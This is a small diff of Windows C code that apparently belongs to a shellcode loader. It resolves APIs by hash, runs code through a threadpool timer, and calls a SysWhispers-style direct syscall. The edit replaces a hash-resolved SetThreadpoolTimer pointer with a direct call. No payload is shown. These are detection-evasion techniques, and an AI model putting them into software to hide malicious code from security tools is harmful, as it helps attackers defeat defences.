@@ -378,7 +378,6 @@ int main() {
 	PTP_TIMER			ptpTimer = NULL;
 
 	fnCreateThreadpoolTimer pCreateThreadpoolTimer = get_proc_address_hash(kernelbase_module, CreateThreadpoolTimer_HASH);
-	fnSetThreadpoolTimer pSetThreadpoolTimer = get_proc_address_hash(kernelbase_module, SetThreadpoolTimer_HASH);
 
 	// Inline function
 	InitializeThreadpoolEnvironment(&tpCallbackEnv);
@@ -387,7 +386,7 @@ int main() {
 	ulDueTime.QuadPart = (ULONGLONG) 0;
 	FileDueTime.dwHighDateTime = ulDueTime.HighPart;
 	FileDueTime.dwLowDateTime = ulDueTime.LowPart;
-	pSetThreadpoolTimer(ptpTimer, &FileDueTime, 0x00, 0x00);
+	SetThreadpoolTimer(ptpTimer, &FileDueTime, 0x00, 0x00);
 	Sw3NtWaitForSingleObject((HANDLE)-1, FALSE, INFINITE);
 
 	// Replacement for getchar(), since getchar() is in the CRT
